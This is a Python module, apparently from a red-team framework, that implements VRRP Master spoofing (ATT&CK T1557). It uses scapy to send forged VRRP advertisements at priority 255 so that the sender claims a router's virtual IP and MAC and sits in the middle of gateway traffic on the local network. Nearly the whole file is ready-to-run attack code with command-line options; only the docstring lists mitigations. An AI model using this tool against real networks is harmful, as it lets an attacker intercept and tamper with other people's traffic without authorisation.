"""
VRRP Master Spoofing — T1557

Sends VRRP advertisements with priority 255 to win Master election
for a VRID. Backup routers demote to Backup; attacker owns the
virtual IP/MAC (00:00:5e:00:01:XX) — gateway MITM.

Requires: same L2 as VRRP peers, no auth or plaintext auth.
VRRP uses IP proto 112, TTL 255, mcast 224.0.0.18.

Mitigation: VRRP authentication, accept-mode off, priority hardening.
"""
import time

from scapy.all import Ether, IP, sendp
from scapy.layers.vrrp import VRRP

NAME = "vrrp"
DESCRIPTION = "VRRP Master spoofing — gateway MITM via VRID takeover"
ATTCK_ID = "T1557"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                              description=__doc__)
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("--vrid", type=int, default=1, help="VRID (1-255)")
    p.add_argument("--virtual-ip", required=True, help="Virtual IP to claim")
    p.add_argument("--priority", type=int, default=255, help="Priority (255 wins)")
    p.add_argument("-c", "--count", type=int, default=10)
    p.add_argument("--interval", type=float, default=1.0,
                   help="Advertisement interval (match peer, default 1s)")
    p.add_argument("--verbose", "-v", action="store_true")
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    from core.common import require_root
    require_root()
    if not 1 <= args.vrid <= 255:
        logger.error("VRID must be 1-255")
        return 1
    logger.info("START | technique=%s | iface=%s | vrid=%d | vip=%s | prio=%d",
                ATTCK_ID, args.interface, args.vrid, args.virtual_ip, args.priority)
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


def _execute(args, logger=None):
    _log = logger.info if logger else print
    vmac = f"00:00:5e:00:01:{args.vrid:02x}"
    try:
        for i in range(args.count):
            pkt = (Ether(dst="01:00:5e:00:00:12", src=vmac) /
                   IP(src=args.virtual_ip, dst="224.0.0.18", ttl=255, proto=112) /
                   VRRP(version=2, vrid=args.vrid, priority=args.priority,
                        auth_type=0, adv=1, addrs=[args.virtual_ip]))
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            if (i + 1) % 5 == 0:
                _log(f"[VRRP] ADV {i+1}/{args.count} vrid={args.vrid} vip={args.virtual_ip}")
            time.sleep(args.interval)
        _log("[VRRP] Done — peer should show Backup; vip ARPs to attacker")
        return True
    except Exception as e:
        _log(f"[VRRP] Error: {e}")
        return False
